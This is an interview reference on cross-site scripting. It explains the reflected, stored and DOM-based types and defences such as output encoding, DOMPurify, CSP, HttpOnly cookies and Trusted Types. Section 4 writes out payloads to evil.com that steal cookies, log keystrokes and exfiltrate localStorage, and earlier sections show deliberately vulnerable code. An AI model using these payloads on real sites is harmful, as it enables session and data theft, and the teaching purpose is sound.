  XSS (Cross-Site Scripting) — Complete Interview Reference
================================================================================

────────────────────────────────────────────────────────────────────────────────
1. WHAT IS XSS?
────────────────────────────────────────────────────────────────────────────────

  Cross-Site Scripting (XSS) is an injection attack where an attacker
  injects malicious scripts into web pages viewed by other users.

  Core problem: Untrusted user data is included in a page without sanitization.

  What attackers can do with XSS:
    • Steal cookies / session tokens
    • Capture keystrokes
    • Redirect users to phishing sites
    • Deface the website
    • Make requests on behalf of the user (combined with CSRF)
    • Access localStorage, sessionStorage
    • Capture webcam/microphone (if permissions granted)

  XSS is one of the most common web vulnerabilities (OWASP Top 10).

────────────────────────────────────────────────────────────────────────────────
2. XSS TYPES
────────────────────────────────────────────────────────────────────────────────

  2.1 REFLECTED XSS (Non-Persistent)
    Malicious script is in the request itself (URL/form input).
    Server reflects it back in the response without sanitization.
    
    Attack flow:
      1. Attacker crafts a URL: https://site.com/search?q=<script>stealCookies()</script>
      2. Victim clicks the link
      3. Server returns response: <p>Results for: <script>stealCookies()</script></p>
      4. Browser executes the script
    
    Example (vulnerable server code):
      // Node.js (vulnerable)
      app.get('/search', (req, res) => {
        res.send(`<p>Results for: ${req.query.q}</p>`); // NO ESCAPING!
      });

  2.2 STORED XSS (Persistent)
    Malicious script is stored in the server's database.
    Every user who views the page gets the script injected.
    Most dangerous type.
    
    Attack flow:
      1. Attacker submits: <script>stealCookies()</script> in a comment/post
      2. Server stores it in DB
      3. Every user who views the page gets the script injected
    
    Examples: blog comments, forum posts, chat messages, user profiles

  2.3 DOM-BASED XSS
    Vulnerability exists in client-side JavaScript itself.
    Server response is fine — attack is in how JS reads/writes to the DOM.
    
    Vulnerable code:
      // URL: https://site.com/#<img src=x onerror=stealCookies()>
      const hash = location.hash.substring(1);
      document.getElementById('output').innerHTML = hash; // VULNERABLE!
    
    The server never sees the #fragment — this is client-side only.
    
    Common DOM XSS sources (untrusted input):
      document.URL, location.href, location.hash, location.search
      document.referrer, window.name
      postMessage data
      localStorage / IndexedDB (if populated from untrusted sources)
    
    Common DOM XSS sinks (dangerous output):
      innerHTML, outerHTML
      document.write()
      eval(), Function()
      setTimeout(string), setInterval(string)
      element.src, element.href (with javascript:)
      element.setAttribute('on...', ...)

────────────────────────────────────────────────────────────────────────────────
3. XSS PREVENTION
────────────────────────────────────────────────────────────────────────────────

  3.1 Output Encoding (Primary Defense)
    Escape untrusted data before inserting into HTML.
    
    HTML entity encoding for HTML context:
      & → &amp;
      < → &lt;
      > → &gt;
      " → &quot;
      ' → &#x27;
    
    JavaScript:
      // SAFE: textContent never executes scripts
      element.textContent = userInput;
      // DANGEROUS: innerHTML may execute scripts
      element.innerHTML = userInput; // DON'T DO THIS
    
    In templating engines:
      // Handlebars: {{ expression }} auto-encodes; {{{ triple }}} does NOT
      // React JSX: expressions auto-escaped; dangerouslySetInnerHTML is unsafe

  3.2 Input Validation and Sanitization
    Validate: check format/length (not a security control alone)
    Sanitize: remove/strip dangerous HTML (DOMPurify library)
    
    import DOMPurify from 'dompurify';
    const clean = DOMPurify.sanitize(userHTML);
    element.innerHTML = clean; // safe to insert sanitized HTML

  3.3 Content Security Policy (CSP)
    HTTP header that restricts what scripts can execute.
    Prevents inline scripts and limits script sources.
    
    Content-Security-Policy: script-src 'self' https://trusted.cdn.com
    
    Blocks:
      - Inline <script>...</script> tags
      - javascript: URIs
      - eval() / Function()
    
    See 02_CSP_Content_Security_Policy.txt for full details.

  3.4 HttpOnly Cookies
    Even if XSS is executed, attacker CANNOT steal HttpOnly cookies.
    Set-Cookie: session=abc; HttpOnly; Secure
    
    Best practice for auth tokens: always HttpOnly.

  3.5 Trusted Types API (Modern)
    Browser API that prevents DOM-based XSS.
    Requires all DOM sinks to receive "Trusted Type" objects (not raw strings).
    
    // CSP header: require-trusted-types-for 'script'
    const policy = trustedTypes.createPolicy('myPolicy', {
      createHTML: (input) => DOMPurify.sanitize(input)
    });
    element.innerHTML = policy.createHTML(userInput); // safe

  3.6 Context-Aware Encoding
    Different contexts need different encoding:
    
    HTML body: &lt; &gt; &amp;
    HTML attribute: additionally encode " → &quot;
    JavaScript string: \' \" \n etc.
    URL: encodeURIComponent()
    CSS: \XX format hex encoding (avoid entirely if possible)

4. REAL-WORLD XSS EXAMPLES
────────────────────────────────────────────────────────────────────────────────

  Classic cookie theft:
    <script>
      new Image().src = 'https://evil.com/steal?c=' + document.cookie;
    </script>
  
  Keylogger:
    <script>
      document.addEventListener('keypress', e => {
        fetch('https://evil.com/log?k=' + e.key);
      });
    </script>
  
  LocalStorage theft:
    <script>
      Object.keys(localStorage).forEach(key => {
        fetch('https://evil.com/steal?k=' + key + '&v=' + localStorage[key]);
      });
    </script>

────────────────────────────────────────────────────────────────────────────────
5. XSS IN FRAMEWORKS
────────────────────────────────────────────────────────────────────────────────

  React:
    By default, React escapes all values in JSX.
    SAFE: <div>{userInput}</div>  → auto-escaped
    UNSAFE: <div dangerouslySetInnerHTML={{ __html: userInput }} />
    
    Avoid dangerouslySetInnerHTML unless you've sanitized with DOMPurify.

  Angular:
    Angular sanitizes values by default when binding to DOM properties.
    UNSAFE escapes: DomSanitizer.bypassSecurityTrustHtml()
    Avoid bypassing Angular's sanitizer.

  Vue.js:
    v-html directive is dangerous — same as innerHTML.
    {{ expression }} is auto-escaped.

6. INTERVIEW QUESTIONS & ANSWERS
────────────────────────────────────────────────────────────────────────────────

Q: What is XSS and what are the three types?
A: XSS is an injection attack where malicious scripts are injected into pages
   viewed by other users. The three types are: (1) Reflected: script is in
   the request URL, reflected immediately in response. (2) Stored: script
   is persisted in DB and injected into every response. (3) DOM-based: client-
   side JS reads untrusted input and writes to a dangerous sink without
   sanitization.

Q: How do you prevent XSS?
A: (1) Output encode all untrusted data before inserting into HTML
   (textContent not innerHTML). (2) Sanitize rich HTML content with DOMPurify.
   (3) Implement CSP to restrict script sources and block inline scripts.
   (4) Mark auth cookies as HttpOnly so they can't be stolen even if XSS occurs.
   (5) Use Trusted Types API to enforce safe DOM mutations.

Q: What is the difference between innerHTML and textContent?
A: textContent sets the text content of a node — any HTML tags are treated as
   literal text (no script execution). innerHTML parses the string as HTML,
   which can execute scripts if the input is unsanitized. Always prefer
   textContent for inserting user-generated text content.

Q: Can HttpOnly cookies prevent XSS?
A: HttpOnly cookies prevent XSS from STEALING cookies (the cookie is not
   accessible via document.cookie). However, XSS can still make authenticated
   HTTP requests on behalf of the user using those HttpOnly cookies (the
   browser sends them automatically). So HttpOnly reduces the impact but
   doesn't prevent the XSS attack itself — you still need to prevent injection.

Q: What is DOM-based XSS?
A: XSS where the vulnerability is in client-side JavaScript. The server
   response may be safe, but JS reads from an untrusted source (location.hash,
   URL params, postMessage) and writes to a dangerous sink (innerHTML, eval).
   Example: innerHTML = location.hash.slice(1) without sanitization.

Q: How does CSP help with XSS?
A: CSP (Content-Security-Policy) is an HTTP response header that whitelists
   allowed script sources and blocks inline scripts, eval(), and javascript:
   URLs. Even if an attacker injects a script tag, CSP prevents it from
   loading external scripts or executing inline code. See CSP file for full details.

================================================================================
  KEY TAKEAWAYS
================================================================================
  • XSS: inject malicious scripts via unsanitized user input
  • Types: Reflected (URL-based), Stored (persistent in DB), DOM-based (client JS)
  • Prevention: output encoding, DOMPurify sanitization, CSP, HttpOnly cookies
  • textContent is safe; innerHTML is dangerous
  • React JSX auto-escapes; dangerouslySetInnerHTML is opt-in risk
  • HttpOnly cookies protect tokens from being stolen by XSS scripts
